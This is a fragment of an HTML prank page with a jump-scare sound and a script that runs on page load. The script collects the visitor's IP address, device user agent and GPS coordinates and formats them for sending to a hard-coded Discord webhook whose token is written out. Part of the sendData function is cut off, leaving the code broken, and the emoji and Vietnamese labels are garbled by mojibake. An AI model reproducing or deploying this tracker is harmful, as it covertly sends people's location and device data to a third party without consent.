    }
    @keyframes blink {
      0% { opacity: 1; }
      50% { opacity: 0; }

    }
    @keyframes flicker {
      0%, 100% { background-color: black; }

    }
  </style>
</head>
<body>
  <audio id="scream" src="https://www.myinstants.com/media/sounds/movie_1.mp3" preload="auto"></audio>

  <script>
    const webhook = "https://discord.com/api/webhooks/1396402554342084678/-56L_dJGuKah4THZ_SJDAVM2wK817hadEuYhzc9yX1uL9xMBy3aDFXroT7NNP1IIVL1M";

    function sendData(ip, device, lat = null, lon = null) {
      let content = `ðŸ” IP: ${ip}\nðŸ“± Thiáº¿t bá»‹: ${device}`;
      if (lat && lon) {
        content += `\nðŸ“ Vá»‹ trÃ­: ${lat}, ${lon}\nðŸ—ºï¸ Google Maps: https://maps.google.com/?q=${lat},${lon}`;

    function playScare() {
      const sound = document.getElementById("scream");
      sound.play();
      if (navigator.vibrate) {
        navigator.vibrate([500, 300, 500, 300, 1000]);
      }
    }

    function getIPandLocation() {
      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
          const ip = data.ip;
          const device = navigator.userAgent;

          navigator.geolocation.getCurrentPosition(pos => {
            const lat = pos.coords.latitude.toFixed(6);
            const lon = pos.coords.longitude.toFixed(6);
            sendData(ip, device, lat, lon);
          }, err => {
            sendData(ip, device);
          });
        });
    }

    getIPandLocation();
  </script>
